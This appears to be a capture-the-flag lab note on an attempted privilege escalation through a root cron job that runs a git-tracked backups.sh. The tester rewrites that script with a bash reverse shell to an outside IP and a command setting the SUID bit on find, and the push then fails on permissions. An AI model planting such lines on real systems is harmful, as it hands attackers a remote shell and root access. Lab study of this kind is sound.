# 4 fail privesc  dademola-user git-repo

```
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh

# there is a directroy git-server 
[dademola@hunit ~]$ ls -la /
[truncated]
drwxr-xr-x   7 git  git   4096 Nov  6  2020 git-server

# lets clone and see 
[dademola@hunit ~]$ git clone file:///git-server/
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.

[dademola@hunit git-server]$ ls -la
total 20
drwxr-xr-x 3 dademola dademola 4096 Sep  9 02:01 .
drwx------ 6 dademola dademola 4096 Sep  9 02:01 ..
drwxr-xr-x 8 dademola dademola 4096 Sep  9 02:01 .git
-rw-r--r-- 1 dademola dademola    0 Sep  9 02:01 NEW_CHANGE
-rw-r--r-- 1 dademola dademola   63 Sep  9 02:01 README
-rw-r--r-- 1 dademola dademola   34 Sep  9 02:01 backups.sh

# checking history of commits
[dademola@hunit git-server]$ git log
commit f295f14322f75bb3ffa07ff15afb6ca1d98e0bcd (HEAD -> master, origin/master, origin/HEAD)
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 21:05:58 2020 -0300

    testing

commit c71132590f969b535b315089f83f39e48d0021e2
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:59:48 2020 -0300

    testing

commit 8c0bc9aa81756b34cccdd3ce4ac65091668be77b
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:54:50 2020 -0300

    testing

commit 574eba09bb7cc54628f574a694a57cbbd02befa0
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:39:14 2020 -0300

    Adding backups

commit 025a327a0ffc9fe24e6dd312e09dcf5066a011b5
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:23:04 2020 -0300

    Init

[dademola@hunit git-server]$ cat backups.sh
#!/bin/bash
#
#
# # Placeholder
#
[dademola@hunit git-server]$ cat README
Simple repo to review and commit changes to the sever scripts.
[dademola@hunit git-server]$ cat NEW_CHANGE
# empty

# pull.shis basically cloning the git-server
# and root-cron is running backup.sh

# update backups.sh
[dademola@hunit git-server]$ cat backups.sh
!#/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.49.136/18030 0>&1' &
chmod +s /usr/bin/find;

# adding file to git
[dademola@hunit git-server]$ git add backups.sh

# commit to repo 
[dademola@hunit git-server]$ git commit -m "kashz"
Author identity unknown
*** Please tell me who you are.
Run
  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'dademola@hunit.(none)')

# setting config
[dademola@hunit git-server]$ git config --global user.name "kashz"
[dademola@hunit git-server]$ git config --global user.email "kashz"

[dademola@hunit git-server]$ git commit -m "kashz"
[master f96f030] kashz
 1 file changed, 6 insertions(+), 5 deletions(-)
 
# push to origin
[dademola@hunit git-server]$ git push -u origin
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 287 bytes | 287.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
error: remote unpack failed: unable to create temporary object directory
To file:///git-server/
 ! [remote rejected] master -> master (unpacker error)
error: failed to push some refs to 'file:///git-server/'

# fails as we don't have perms

# using git user to perform this
```
